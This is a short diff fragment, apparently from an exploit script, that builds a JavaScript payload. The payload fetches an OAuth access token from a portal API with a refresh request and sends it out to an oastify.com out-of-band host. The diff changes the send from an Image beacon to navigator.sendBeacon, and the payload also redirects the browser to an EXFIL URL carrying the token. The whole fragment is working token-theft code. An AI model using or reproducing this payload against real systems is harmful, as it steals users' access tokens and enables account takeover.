@@ -20,7 +20,7 @@
      var payload = "fetch('/portal/api/v2/oauth/token?refresh=true')"
         + ".then(function(r){return r.json()})"
         + ".then(function(d){"
-        + "  new Image().src='https://snjyw20i332wincvppz8ddkullrnfc.oastify.com/?token='+encodeURIComponent(d.access_token);"
+        + "  navigator.sendBeacon('https://snjyw20i332wincvppz8ddkullrnfc.oastify.com/?token='+encodeURIComponent(d.access_token));"
         + "  location='" + EXFIL + "?token='+encodeURIComponent(d.access_token);"
         + "})"
         + ".catch(function(e){"
